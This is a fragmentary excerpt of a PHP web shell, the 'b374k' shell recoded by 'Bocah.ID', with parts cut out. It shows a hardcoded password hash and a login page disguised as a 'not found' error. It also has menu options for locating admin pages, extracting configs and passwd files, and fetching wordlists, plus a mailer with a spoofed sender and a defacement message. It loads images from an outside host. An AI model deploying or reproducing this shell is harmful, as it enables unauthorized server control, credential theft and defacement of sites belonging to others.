...
/* (Web Shell b374k r3c0d3d by Bocah.ID|default pass:" Bocah.ID ") */ 
$auth_pass = "69800bfef021503782c7f2d891aab5cf"; 
$color = "#FF0000"; 
...
function printLogin() { 
    ?> 
<h1>Ora Nemu</h1> 
<p>penjalukanmu Ra isa nemu nang server.</p> 
<hr> 
<address>Server mleduk <?=$_SERVER['HTTP_HOST']?> mlebu wae!</address> 
    <style> 
        input { margin:0;background-color:#FF0000;border:1px solid #FF0000; } 
    </style> 
    <center> 
    <form method=post> 
...
?>
<html><head><link rel="SHORTCUT ICON" href="http://texups.com/templates/icon.png"><title>=[ Bocah.ID privat shell ]=</title>
...
<div class="head_info">
<table ><tr>
<td><table class="b374k_tbl"><tr><td><a href="?"><span class="b374k"><img src="http://texups.com/templates/BocahID.png" /></span></a></td></tr><tr><td><b>Bocah.ID Private Shell v1.1</b></td></tr></table></td>
<td><?php echo $buff; ?></td>
</tr></table>
</div>
<!-- head info end here -->
...
<a href="?<?php echo "y=".$pwd; ?>&amp;x=adfin">Temukan Page Admin</a>
...
<a href="?<?php echo "y=".$pwd; ?>&amp;x=about">Tentang</a>
<a href="?<?php echo "y=".$pwd;	?>&amp;x=logout">Keluar</a>
...
<tr><td>&nbsp;<input class="inputz" style="width:20%;" type="text" value="mr.tech@fbi.al" name="mail_from" />&nbsp; from</td></tr>
...
<tr>
    <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>Dapatkan Config :</strong></td>
    				</tr>
<form method="POST" target="_blank">
	<strong>
<input name="mendapatkan" type="hidden" value="passwd">        				
    ...
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Nama Folder :</strong></td>
...
<tr>
    <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>dapatkan wordlist</strong></td>
    				</tr>
<form method="POST" target="_blank">
	<strong>
...
<textarea style='background:black;outline:none;' name='index' rows='10' cols='67'>HACKED BY Bocah.ID,PATCH YOUR SECURITY SYSTEM</textarea><br>
...
?><center><br><br><div class="info">-=[ b374k r3c0ded by <b>Bocah.ID</b> ]=-</div><br>
<div class="jaya">&copy; 2013 Bocah.ID</div></center><br><br>
</script>
</div>
</body>
</html>